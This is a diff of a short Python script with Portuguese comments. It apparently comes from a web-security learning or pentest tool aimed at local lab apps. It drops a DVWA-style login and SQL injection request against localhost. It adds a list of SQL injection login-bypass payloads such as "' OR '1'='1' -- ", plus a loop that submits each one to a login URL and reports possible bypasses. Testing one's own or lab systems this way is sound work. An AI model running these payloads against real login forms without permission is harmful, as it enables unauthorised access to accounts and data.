@@ -1,55 +1,49 @@
 
 import requests
-from src.recon.spider import html_extractor
 from bs4 import BeautifulSoup
 
-# Cria uma sessão para manter cookies e headers
-session_actual = requests.Session()
+# Lista de payloads para tentar burlar a injeção SQL em campos de login
+bypass_sql_injection_list = [
+    "' OR '1'='1",
+    "' OR '1'='1' -- ",
+    "' OR '1'='1' ({",
+    "' OR '1'='1' /*",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR 'a'='a",
+    "' OR 'a'='a' -- ",
+    "' OR 'a'='a' ({",
+    "' OR 'a'='a' /*",
+    "' OR '1'='1' LIMIT 1; -- ",
+    "' OR '1'='1' LIMIT 1; #",
+    "' OR '1'='1' LIMIT 1; /*"
+]
 
-def login_test(url, dictionary_login, session):
+def login_test(url, json_login):
     """Realiza o POST de login e retorna o response."""
     try:
-        response = session.post(url, data=dictionary_login)
+        response = requests.post(url, json=json_login)
         return response
     except requests.exceptions.RequestException as e:
         print(f"An error occurred: {e}")
         return
 
-def token_extractor(url, token_name, session):
-    """Extrai o valor do token CSRF da página de login."""
-    soup = html_extractor(url, session)
-    token = soup.find("input", {"name": token_name})['value']
-    return token
+def json_login_build(email, password):
+    """Cria o payload JSON para o login."""
+    return {
+        "email": email,
+        "password": password
+    }
 
-# Extrai o token CSRF da página de login
-user_token = token_extractor("http://localhost/login.php", "user_token", session_actual)
-
-# Monta o dicionário de login
-dictionary_login = {
-    "username": "admin",
-    "password": "password",
-    "user_token": f"{user_token}",
-    "Login": "Login"
-}
-
-dictionary_sql_injection = {
-    "id" : "' OR 1=1#",
-    "Submit" : "Submit"
-}
-
-def get_user_id(url, dictionary_sql_injection, session):
-    """Realiza o GET com SQL Injection e retorna o response."""
-    try:
-        response = session.get(url, data=dictionary_sql_injection)
-        return response
-    except requests.exceptions.RequestException as e:
-        print(f"An error occurred: {e}")
-        return
+def sql_injection_test(payloads, url):
+    """Testa cada payload na lista de injeção SQL."""
+    for payload in payloads:
+        json_login = json_login_build(payload, "password")
+        response = login_test(url, json_login)
+        if response.status_code == 200:
+            print(f"Payload '{payload}' may have bypassed authentication!")
+        else:
+            print(f"Payload '{payload}' did not bypass authentication.")
 
 
-# Realiza o login
-resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)
-resposta = get_user_id("http://localhost/vulnerabilities/sqli/", dictionary_sql_injection, session_actual)
-
-# Exibe o HTML retornado
-print(resposta.text)
